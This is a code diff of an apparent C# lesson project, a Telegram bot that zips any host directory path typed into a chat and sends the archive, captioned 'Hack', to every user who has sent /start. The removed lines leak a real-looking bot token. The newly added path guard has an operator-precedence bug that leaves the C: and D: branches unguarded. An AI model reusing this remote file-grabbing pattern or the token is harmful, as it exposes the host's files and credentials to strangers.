@@ -10,14 +10,16 @@ namespace _27_lesson_TelegramBot_keyboard_inlineKeyboard
 {
     public class ZipperFile
     {
+        private bool isEnter = false;
+
         public async Task Server()
         {
 
-            var botClient = new TelegramBotClient("6560962263:AAHOhhhUy6eSDvD3yVAbn7vDIFgp-b4P-Go");
+            var botClient = new TelegramBotClient("Your token");
 
             using CancellationTokenSource cts = new();
 
-            HashSet<long> users = [];
+            HashSet<long> users = new HashSet<long>();
             string? fileName = null;
             ReceiverOptions receiverOptions = new()
             {
@@ -54,20 +56,22 @@ namespace _27_lesson_TelegramBot_keyboard_inlineKeyboard
                 var user = message.Chat.FirstName;
                 var handler = message.Type switch
                 {
-                    MessageType.Text => HandleTextMessageAsync(botClient, update, cancellationToken, user),
+                    MessageType.Text => HandleTextMessageAsync(botClient, update, cancellationToken),
                     _ => HandleUnknownMessageTypeAsync(update, update, cancellationToken),
                 };
             }
 
-            async Task HandleTextMessageAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken, string user)
+            async Task HandleTextMessageAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
             {
                 //return;
                 if (update.Message.Text == "/start")
                 {
                     users.Add(update.Message.Chat.Id);
+                    isEnter = true;
                     ReplyKeyboardMarkup replyKeyboardMarkup = new(new[]
                     {
-                    new KeyboardButton[] { "Path kiriting!"}
+                    new KeyboardButton[] { "Enter path!"},
+                    new KeyboardButton[] {"Change Start path!"}
                 })
                     {
                         ResizeKeyboard = true
@@ -75,7 +79,7 @@ namespace _27_lesson_TelegramBot_keyboard_inlineKeyboard
 
                     Message sentMessage = await botClient.SendTextMessageAsync(
                         chatId: update.Message.Chat.Id,
-                        text: "Choose response",
+                        text: "Choose a response",
                         replyMarkup: replyKeyboardMarkup,
                         cancellationToken: cancellationToken);
                 }
@@ -89,7 +93,7 @@ namespace _27_lesson_TelegramBot_keyboard_inlineKeyboard
                          );
                 }
 
-                else if (update.Message.Text.StartsWith("D:") || update.Message.Text.StartsWith("C:") || update.Message.Text.StartsWith("E:"))
+                else if (update.Message.Text.StartsWith("D:") || update.Message.Text.StartsWith("C:") || update.Message.Text.StartsWith("E:") && isEnter)
                 {
                     string path = update.Message.Text;
                     if (System.IO.Directory.Exists(path) == true)
@@ -122,6 +126,7 @@ namespace _27_lesson_TelegramBot_keyboard_inlineKeyboard
                                 chatId: item,
                                 document: InputFile.FromStream(stream: stream, fileName: $"{arr[arr.Length - 1]}.zip"),
                                 caption: "Hack");
+                            Console.WriteLine(arr[arr.Length - 1]);
                         }
                     }
                     else
